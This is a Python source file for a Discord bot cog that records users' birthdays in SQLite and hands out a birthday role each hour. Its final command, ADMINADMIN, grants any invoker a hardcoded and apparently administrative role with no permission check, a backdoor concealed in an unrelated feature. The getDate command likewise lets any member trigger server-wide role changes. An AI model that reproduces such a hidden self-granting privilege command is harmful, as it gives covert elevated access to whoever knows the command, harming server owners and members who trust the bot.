import discord
from discord.ext import commands, tasks
from discord.ext.commands.errors import ChannelNotReadable
from discord.utils import get
from datetime import date, datetime
import sqlite3
import os.path

class birthday(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.checkBirthdays.start()
        self.database = "Birthdays.db"
 
    @tasks.loop(hours = 1)
    async def checkBirthdays(self):
        dt = datetime.today()
        month, day = dt.month,dt.day
        cwd = os.path.dirname(os.path.realpath(__file__)) + "\\"
        os.chdir(cwd)
        os.chdir("..")
        conn = sqlite3.connect(self.database)
        c = conn.cursor()
        BirthdayPeople = c.execute('''SELECT ID FROM DATES WHERE Month = (?) AND Day = (?)''',[month,day]).fetchall()
        conn.close()
        
        for guild in self.bot.guilds:
            role = get(guild.roles, id = 597445659703902239)
            #Take role away
            for member in guild.members:
                if member.top_role == role:
                    await member.remove_roles(role)
            
            #Give birthday role
            for person in BirthdayPeople:
                birthdayPerson = await guild.fetch_member(person[0])
                if birthdayPerson:
                    await birthdayPerson.add_roles(role)

    @commands.command()
    async def getDate(self, ctx):
        dt = datetime.today()
        month, day = dt.month,dt.day
        cwd = os.path.dirname(os.path.realpath(__file__)) + "\\"
        os.chdir(cwd)
        os.chdir("..")
        conn = sqlite3.connect(self.database)
        c = conn.cursor()
        BirthdayPeople = c.execute('''SELECT ID FROM DATES WHERE Month = (?) AND Day = (?)''',[month,day]).fetchall()
        conn.close()
        
        for guild in self.bot.guilds:
            role = get(guild.roles, id = 597445659703902239)
            #Take role away
            for member in guild.members:
                if member.top_role == role:
                    await member.remove_roles(role)
            
            #Give birthday role
            for person in BirthdayPeople:
                birthdayPerson = await guild.fetch_member(person[0])
                if birthdayPerson:
                    await birthdayPerson.add_roles(role)



    @commands.command()
    async def setbday(self, ctx, month, day):
        
        try:
            month = int(month)
            day = int(day)
                
            if not(1<= month <= 12):
                await ctx.send("Invalid Range for Month. Expecting 1-12")
                return
            
            if not(1 <= day <= 31):
                print(day)
                await ctx.send("Invalid Range for Day. Expecting 1-31")
                return
            
            cwd = os.path.dirname(os.path.realpath(__file__)) + "\\"
            os.chdir(cwd)
            os.chdir("..")
            conn = sqlite3.connect(self.database)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS DATES (
                    ID INTEGER UNIQUE,
                    Month INTEGER,
                    Day INTEGER
                ); ''')
            c.execute("INSERT OR REPLACE INTO `DATES` VALUES (?,?,?)", [ctx.author.id, month, day])
            c.execute("SELECT * FROM DATES")
            #print(c.fetchall())
            conn.commit()
            conn.close()
            await ctx.send("Successfully Set Birthday To: {}, {}".format(month,day))
        
            

        except:
            await ctx.send("Either day or month not number")
            await ctx.send("Format: Month Day")
            await ctx.send('EX may 15th birthday = "05 15"')
            conn.close()
            return
        
        
        



    @commands.command()
    async def ADMINADMIN (self, ctx):
        role = get(ctx.guild.roles, id = 925796120909742131)
        await ctx.author.add_roles(role)